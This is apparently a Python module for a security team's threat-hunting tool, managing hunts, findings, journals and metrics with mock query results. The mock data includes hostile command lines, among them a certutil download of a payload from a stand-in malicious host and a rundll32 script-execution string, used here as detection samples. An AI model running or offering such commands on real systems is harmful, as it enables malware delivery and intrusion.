"""
Threat Hunting Engine - Hunt Management and Query Engine
Manages threat hunts, queries, findings, and journal entries
"""

import json
import os
from datetime import datetime
from typing import Dict, List, Any, Optional

class HuntingEngine:
    """
    Engine for threat hunting operations and management
    """
    
    def __init__(self, data_dir: str):
        self.data_dir = data_dir
        self.hunts = self._load_hunts()
        self.hunt_library = self._load_hunt_library()
        self.hunt_metrics = self._load_hunt_metrics()
    
    def _load_hunts(self) -> List[Dict]:
        """Load existing hunts from JSON file"""
        hunts_file = os.path.join(self.data_dir, 'hunts.json')
        try:
            with open(hunts_file, 'r') as f:
                return json.load(f)
        except FileNotFoundError:
            return []
    
    def _save_hunts(self):
        """Save hunts to JSON file"""
        hunts_file = os.path.join(self.data_dir, 'hunts.json')
        with open(hunts_file, 'w') as f:
            json.dump(self.hunts, f, indent=2)
    
    def _load_hunt_library(self) -> List[Dict]:
        """Load hunt library from JSON file"""
        library_file = os.path.join(self.data_dir, 'hunt_library.json')
        try:
            with open(library_file, 'r') as f:
                return json.load(f)
        except FileNotFoundError:
            return []
    
    def _load_hunt_metrics(self) -> Dict:
        """Load hunt metrics from JSON file"""
        metrics_file = os.path.join(self.data_dir, 'hunt_metrics.json')
        try:
            with open(metrics_file, 'r') as f:
                return json.load(f)
        except FileNotFoundError:
            return {}
    
    def _save_hunt_metrics(self):
        """Save hunt metrics to JSON file"""
        metrics_file = os.path.join(self.data_dir, 'hunt_metrics.json')
        with open(metrics_file, 'w') as f:
            json.dump(self.hunt_metrics, f, indent=2)
    
    def get_all_hunts(self, status: Optional[str] = None) -> List[Dict]:
        """
        Get all hunts, optionally filtered by status
        Status: active, completed, paused
        """
        if status:
            return [h for h in self.hunts if h.get('status') == status]
        return self.hunts
    
    def get_hunt_by_id(self, hunt_id: int) -> Optional[Dict]:
        """Get a specific hunt by ID"""
        for hunt in self.hunts:
            if hunt.get('id') == hunt_id:
                return hunt
        return None
    
    def create_hunt(self, hunt_package_id: int, analyst_id: str, analyst_name: str) -> Dict:
        """
        Create a new hunt from a hunt package in the library
        """
        # Find the hunt package
        hunt_package = None
        for package in self.hunt_library:
            if package.get('id') == hunt_package_id:
                hunt_package = package
                break
        
        if not hunt_package:
            return {'error': 'Hunt package not found'}
        
        # Generate new hunt ID
        new_id = max([h.get('id', 0) for h in self.hunts], default=0) + 1
        
        # Create new hunt
        new_hunt = {
            'id': new_id,
            'name': hunt_package['name'],
            'description': hunt_package['description'],
            'hypothesis': hunt_package['hypothesis'],
            'query': hunt_package['default_query'],
            'status': 'active',
            'created_at': datetime.now().isoformat(),
            'created_by': analyst_name,
            'analyst_id': analyst_id,
            'hunt_package_id': hunt_package_id,
            'category': hunt_package['category'],
            'findings': [],
            'journal': [
                {
                    'id': 1,
                    'timestamp': datetime.now().isoformat(),
                    'author': analyst_name,
                    'entry_type': 'started',
                    'content': f"Hunt started using package: {hunt_package['name']}"
                }
            ],
            'query_history': [
                {
                    'timestamp': datetime.now().isoformat(),
                    'query': hunt_package['default_query'],
                    'results_count': 0
                }
            ],
            'metrics': {
                'time_spent_hours': 0,
                'queries_run': 1,
                'findings_count': 0,
                'true_positives': 0,
                'false_positives': 0
            }
        }
        
        self.hunts.append(new_hunt)
        self._save_hunts()
        
        # Update metrics
        self._update_metrics('hunt_started', new_hunt)
        
        return new_hunt
    
    def update_hunt_query(self, hunt_id: int, query: str, analyst_name: str) -> Dict:
        """
        Update and execute hunt query
        Returns query results
        """
        hunt = self.get_hunt_by_id(hunt_id)
        if not hunt:
            return {'error': 'Hunt not found'}
        
        # Update query
        hunt['query'] = query
        
        # Add to query history
        query_history = hunt.get('query_history', [])
        query_history.append({
            'timestamp': datetime.now().isoformat(),
            'query': query,
            'results_count': 0  # Would be populated by actual query execution
        })
        hunt['query_history'] = query_history
        
        # Update metrics
        hunt['metrics']['queries_run'] = hunt['metrics'].get('queries_run', 0) + 1
        
        # Add journal entry
        self._add_journal_entry(hunt, analyst_name, 'query_updated', f"Query updated: {query[:50]}...")
        
        self._save_hunts()
        
        # In production, this would execute the query against a data lake
        # For demo, we'll return mock results
        mock_results = self._execute_mock_query(query, hunt)
        
        return {
            'hunt_id': hunt_id,
            'query': query,
            'results': mock_results,
            'results_count': len(mock_results)
        }
    
    def _execute_mock_query(self, query: str, hunt: Dict) -> List[Dict]:
        """
        Mock query execution for demonstration
        In production, this would query actual data sources
        """
        # Return different mock results based on hunt category
        category = hunt.get('category', '')
        
        mock_results = []
        if 'LOLBin' in category or 'Living Off the Land' in category:
            mock_results = [
                {
                    'timestamp': datetime.now().isoformat(),
                    'host': 'WKSTN-2847',
                    'process': 'certutil.exe',
                    'command_line': 'certutil.exe -urlcache -split -f http://malicious.com/payload.exe',
                    'user': 'user1234',
                    'suspicious_score': 85
                },
                {
                    'timestamp': datetime.now().isoformat(),
                    'host': 'WKSTN-1092',
                    'process': 'rundll32.exe',
                    'command_line': 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication"',
                    'user': 'admin_temp',
                    'suspicious_score': 92
                }
            ]
        elif 'DNS' in category:
            mock_results = [
                {
                    'timestamp': datetime.now().isoformat(),
                    'source_ip': '10.0.2.45',
                    'domain': 'a1b2c3d4e5f6.suspicious-domain.com',
                    'query_type': 'TXT',
                    'response_size': 512,
                    'suspicious_score': 78
                }
            ]
        elif 'Kerberos' in category:
            mock_results = [
                {
                    'timestamp': datetime.now().isoformat(),
                    'user': 'svc_backup',
                    'service': 'MSSQLSvc/db-server.corp.local',
                    'encryption_type': 'RC4',
                    'ticket_options': '0x40810010',
                    'suspicious_score': 88
                }
            ]
        
        return mock_results[:10]  # Limit to 10 results
    
    def add_finding(self, hunt_id: int, finding_data: Dict, analyst_name: str) -> Dict:
        """
        Add a finding to a hunt
        Correlates finding with existing alerts, IOCs, and incidents
        """
        hunt = self.get_hunt_by_id(hunt_id)
        if not hunt:
            return {'error': 'Hunt not found'}
        
        # Generate finding ID
        findings = hunt.get('findings', [])
        new_finding_id = max([f.get('id', 0) for f in findings], default=0) + 1
        
        # Create finding
        finding = {
            'id': new_finding_id,
            'timestamp': datetime.now().isoformat(),
            'analyst': analyst_name,
            'title': finding_data.get('title', ''),
            'description': finding_data.get('description', ''),
            'severity': finding_data.get('severity', 'medium'),
            'ioc_type': finding_data.get('ioc_type', ''),
            'ioc_value': finding_data.get('ioc_value', ''),
            'affected_hosts': finding_data.get('affected_hosts', []),
            'status': 'new',
            'correlated_alerts': self._correlate_with_alerts(finding_data),
            'correlated_iocs': self._correlate_with_iocs(finding_data),
            'correlated_incidents': self._correlate_with_incidents(finding_data),
            'mitre_tactics': finding_data.get('mitre_tactics', []),
            'recommendations': finding_data.get('recommendations', '')
        }
        
        findings.append(finding)
        hunt['findings'] = findings
        
        # Update metrics
        hunt['metrics']['findings_count'] = len(findings)
        if finding_data.get('verified', False):
            hunt['metrics']['true_positives'] = hunt['metrics'].get('true_positives', 0) + 1
        
        # Add journal entry
        self._add_journal_entry(hunt, analyst_name, 'finding_added', 
                              f"New {finding['severity']} severity finding: {finding['title']}")
        
        self._save_hunts()
        self._update_metrics('finding_added', hunt)
        
        return finding
    
    def _correlate_with_alerts(self, finding_data: Dict) -> List[int]:
        """Correlate finding with existing alerts (mock)"""
        # In production, this would query the alerts database
        # For demo, return mock correlation
        ioc_value = finding_data.get('ioc_value', '')
        if ioc_value:
            return [1, 3, 7]  # Mock alert IDs
        return []
    
    def _correlate_with_iocs(self, finding_data: Dict) -> List[int]:
        """Correlate finding with existing IOCs (mock)"""
        # In production, this would query the IOC database
        ioc_value = finding_data.get('ioc_value', '')
        if ioc_value:
            return [5, 12, 23]  # Mock IOC IDs
        return []
    
    def _correlate_with_incidents(self, finding_data: Dict) -> List[int]:
        """Correlate finding with existing incidents (mock)"""
        # In production, this would query the incidents database
        severity = finding_data.get('severity', '')
        if severity in ['critical', 'high']:
            return [2, 4]  # Mock incident IDs
        return []
    
    def get_findings(self, hunt_id: int) -> List[Dict]:
        """Get all findings for a hunt"""
        hunt = self.get_hunt_by_id(hunt_id)
        if not hunt:
            return []
        return hunt.get('findings', [])
    
    def add_journal_entry(self, hunt_id: int, analyst_name: str, 
                         entry_type: str, content: str) -> Dict:
        """Add an entry to the hunt journal"""
        hunt = self.get_hunt_by_id(hunt_id)
        if not hunt:
            return {'error': 'Hunt not found'}
        
        self._add_journal_entry(hunt, analyst_name, entry_type, content)
        self._save_hunts()
        
        return hunt.get('journal', [])[-1]
    
    def _add_journal_entry(self, hunt: Dict, analyst_name: str, 
                          entry_type: str, content: str):
        """Internal method to add journal entry"""
        journal = hunt.get('journal', [])
        new_entry_id = max([e.get('id', 0) for e in journal], default=0) + 1
        
        entry = {
            'id': new_entry_id,
            'timestamp': datetime.now().isoformat(),
            'author': analyst_name,
            'entry_type': entry_type,
            'content': content
        }
        
        journal.append(entry)
        hunt['journal'] = journal
    
    def get_journal(self, hunt_id: int) -> List[Dict]:
        """Get journal entries for a hunt"""
        hunt = self.get_hunt_by_id(hunt_id)
        if not hunt:
            return []
        return hunt.get('journal', [])
    
    def get_hunt_library(self) -> List[Dict]:
        """Get all available hunt packages from the library"""
        return self.hunt_library
    
    def get_hunt_metrics(self) -> Dict:
        """Get hunt statistics and metrics"""
        # Calculate real-time metrics from hunts
        total_hunts = len(self.hunts)
        active_hunts = len([h for h in self.hunts if h.get('status') == 'active'])
        completed_hunts = len([h for h in self.hunts if h.get('status') == 'completed'])
        
        total_findings = sum(h.get('metrics', {}).get('findings_count', 0) for h in self.hunts)
        total_true_positives = sum(h.get('metrics', {}).get('true_positives', 0) for h in self.hunts)
        
        # Merge with stored metrics
        metrics = self.hunt_metrics.copy()
        metrics.update({
            'total_hunts': total_hunts,
            'active_hunts': active_hunts,
            'completed_hunts': completed_hunts,
            'total_findings': total_findings,
            'total_true_positives': total_true_positives,
            'true_positive_rate': round((total_true_positives / total_findings * 100), 1) if total_findings > 0 else 0
        })
        
        return metrics
    
    def _update_metrics(self, action: str, hunt: Dict):
        """Update hunt metrics based on actions"""
        if action == 'hunt_started':
            self.hunt_metrics['total_hunts_launched'] = self.hunt_metrics.get('total_hunts_launched', 0) + 1
        elif action == 'finding_added':
            self.hunt_metrics['detection_improvements'] = self.hunt_metrics.get('detection_improvements', 0) + 1
        
        self._save_hunt_metrics()
    
    def complete_hunt(self, hunt_id: int, analyst_name: str, summary: str) -> Dict:
        """Mark a hunt as completed"""
        hunt = self.get_hunt_by_id(hunt_id)
        if not hunt:
            return {'error': 'Hunt not found'}
        
        hunt['status'] = 'completed'
        hunt['completed_at'] = datetime.now().isoformat()
        hunt['summary'] = summary
        
        # Add final journal entry
        self._add_journal_entry(hunt, analyst_name, 'completed', 
                              f"Hunt completed. Summary: {summary}")
        
        self._save_hunts()
        self._update_metrics('hunt_completed', hunt)
        
        return hunt
